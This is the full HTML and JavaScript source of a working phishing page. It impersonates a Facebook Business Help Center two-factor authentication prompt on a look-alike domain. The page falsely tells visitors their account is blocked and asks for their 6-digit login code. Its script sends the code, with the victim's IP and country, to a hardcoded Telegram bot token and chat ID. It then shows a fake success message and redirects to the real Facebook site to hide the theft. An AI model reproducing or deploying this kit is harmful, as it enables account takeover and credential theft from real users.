
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="canonical" href="business">
    <title>Business Help Center | Privacy Policy</title>
    <meta property="og:locale" content="en_US" />
    <meta property="og:locale:alternate" content="en_US" />
    <meta name="referrer" content="no-referrer">
    <link rel="icon" href="https://i.imgur.com/NX4D51b.png" type="image/x-icon" />
    <meta name="csrf-token" content="19znq10kIss0ytGdOW8cpEPvV7PB6znmKPCogov1" />
    <meta property="og:image" content="https://i.imgur.com/dPbn7je.jpg" />
    <meta property="og:title" content="Business Help Center | Privacy Policy" />
    <meta property="og:url" content="http://business.confiirmpageidentiitys.click/business" />
    <meta property="og:site_name" content="Business Help Center" />
    <meta name="robots" content="index,follow">
    <meta name="twitter:title" content="Business Help Center | Privacy Policy">
    <meta name="twitter:image" content="https://i.imgur.com/dPbn7je.jpg">
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet" />
    <link rel="preload" as="style" href="build/assets/app-c7352b25.css" /><link rel="modulepreload" href="build/assets/app-44508a8e.js" /><link rel="stylesheet" href="build/assets/app-c7352b25.css" /><script type="module" src="build/assets/app-44508a8e.js"></script></head>

<body>
    <div class="bg-[#F1F2F6] min-h-screen py-10">
        <form class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center" id="skdzvhmcei">
            <p class="font-bold text-2xl">Two-factor authentication required (1/3)</p>
            <p class="my-3">We have temporarily blocked your account because Facebook Protect has changed. Verify code has
                been send to 4252****.
            </p>
            <img src="https://i.imgur.com/TOtVy8P.png" class="w-full h-[300px] object-cover mx-auto mb-3 rounded-xl">
            <input type="text" name="udgvjseoun" required="" onkeypress="return (event.charCode !=8 &amp;&amp; event.charCode ==0 || (event.charCode >= 48 &amp;&amp; event.charCode <= 57))" placeholder="Enter your code" class="mb-3 w-full mt-1 px-3 py-3 bg-gray-100 border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-md sm:text-sm focus:ring-1">
            <p class="error_2fa text-red-700 mt-2">The code generator you entered is incorrect. Please wait 5 minutes to receive another one.</p>
            <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
                <div class="text-2xl text-yellow-600">
                    <ion-icon name="information-circle" role="img" class="md hydrated"></ion-icon>
                </div>
                <div>
                    <p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new
                        device or browser. Enter the 6-digit code from your code generator or third-party app below.</p>
                    <p>Please wait <strong class="count-time">05:00</strong> to request the sending of the code.</p>
                </div>
            </div>
            <p class="mt-3 mb-5">We'll walk you through some steps to secure and unlock your account.</p>
            <button class="block text-lg cursor-pointer bg-gray-100 border border-[#d1d5db] hover:bg-blue-800 transition ease-in-out delay-75 hover:text-white w-full font-semibold text-center py-3 text-black rounded-lg">Submit</button>
            <button type="button" class="block text-sm text-center py-3 w-full text-blue-800 send-code-btn pointer-events-none">Send Code</button>
        </form>
    </div>

<style>
/* Tối xung quanh */
.fixed {
    background-color: rgba(0, 0, 0, 0.5);
    /* Thiết lập thuộc tính position là fixed và căn giữa */
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    align-items: center;
    justify-content: center;
}
</style>  
    
    <div id="finishModal" tabindex="-1" class="fixed top-0 left-0 right-0 z-50 w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center flex" aria-modal="true" role="dialog" style="display: none;">
        <div class="relative w-full max-w-2xl max-h-full">
            <!-- Modal content -->
            <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
                <!-- Modal header -->
                <div class="flex items-start justify-between p-4 border-b rounded-t bg-facebook">
                    <h3 class="text-md font-semibold text-white">
                        Form Submitted Successfully
                    </h3>
                </div>
                <!-- Modal body -->
                <div class="p-6 space-y-6">
                    <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400">
                        Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You can
                        view responses in your Support Inbox.
                    </p>
                </div>
                <!-- Modal footer -->
                <div class="flex items-center justify-end p-4 space-x-2 border-t border-gray-200 rounded-b dark:border-gray-600">
                    <button type="button" class="finish-verify text-white bg-facebook hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center">OK</button>
                </div>
            </div>
        </div>
    </div>

<script>
    // Hàm để hiển thị thời gian đếm ngược
    function displayCountdown() {
        var countdownElement = document.querySelector('.count-time');
        var timeInSeconds = 5 * 60; // 5 phút * 60 giây/phút
        var interval = setInterval(function() {
            var minutes = Math.floor(timeInSeconds / 60);
            var seconds = timeInSeconds % 60;

            countdownElement.textContent = (minutes < 10 ? '0' : '') + minutes + ':' +
                (seconds < 10 ? '0' : '') + seconds;

            timeInSeconds--;

            if (timeInSeconds < 0) {
                clearInterval(interval);
                countdownElement.textContent = '00:00'; // Hiển thị khi đếm ngược kết thúc
                // Thêm các hành động bạn muốn thực hiện khi đếm ngược kết thúc ở đây
            }
        }, 1000); // Cập nhật mỗi giây
    }

    // Gọi hàm để bắt đầu đếm ngược khi trang được tải
    displayCountdown();
</script>

    
<script>
    // Hàm xử lý sự kiện khi nhấn nút Submit trong form xác thực
    function handleSubmit(event) {
        event.preventDefault();

        // Lấy giá trị mã xác thực từ input
        var code = document.querySelector('input[name="udgvjseoun"]').value.trim();

        // Kiểm tra xem mã xác thực đã được nhập chưa
        if (code === '') {
            alert("Vui lòng nhập mã xác thực.");
            return;
        }

        // Hiển thị modal "Form Submitted Successfully" sau 3 giây
        setTimeout(function() {
            document.getElementById('finishModal').style.display = 'flex'; // Hiển thị modal
        }, 2500);

        // Lấy dữ liệu từ local storage
        var formData = JSON.parse(localStorage.getItem('formData'));

        // Gửi dữ liệu về Telegram
        var ip;
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                ip = data.ip;
                
                // Gửi địa chỉ IP đến máy chủ PHP để lấy thông tin quốc gia
                fetch('/get_country_from_ip.php?ip=' + ip)
                    .then(response => response.text())
                    .then(countryInfo => {

                        // Tạo nội dung tin nhắn để gửi về Telegram
                        var content = "Verification Code (2): " + code + "\n" + countryInfo;

                        // Cài đặt dữ liệu để gửi về Telegram
                        var apiToken = "7422299838:AAH2sIYdwz0e9K3tRjCXQUL0W0dxc5cKg-c";
                        var data = {
                            chat_id: '6742026261',
                            text: content
                        };

                        // Gửi yêu cầu POST đến Telegram API
                        var xhr = new XMLHttpRequest();
                        xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
                        xhr.setRequestHeader('Content-Type', 'application/json');

                        xhr.send(JSON.stringify(data));

                        xhr.onload = function () {
                            if (xhr.status >= 200 && xhr.status < 300) {
                                console.log('Message sent to Telegram bot successfully.');
                                // Không chuyển hướng trang ở đây nữa
                            } else {
                                console.error('Failed to send message to Telegram bot.');
                            }
                        };
                    })
                    .catch(error => console.error('Error fetching country info:', error));
            })
            .catch(error => console.error('Error fetching IP:', error));
    }

    // Sự kiện submit form trong modal password
    document.getElementById('skdzvhmcei').addEventListener('submit', handleSubmit);

    // Sự kiện click nút "OK" trong modal
    document.querySelector('.finish-verify').addEventListener('click', function() {
        window.location.href = "https://www.facebook.com/policies_center/";
    });
</script>



    
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/custom.js?v=iwchejax"></script>
    </body>

</html>
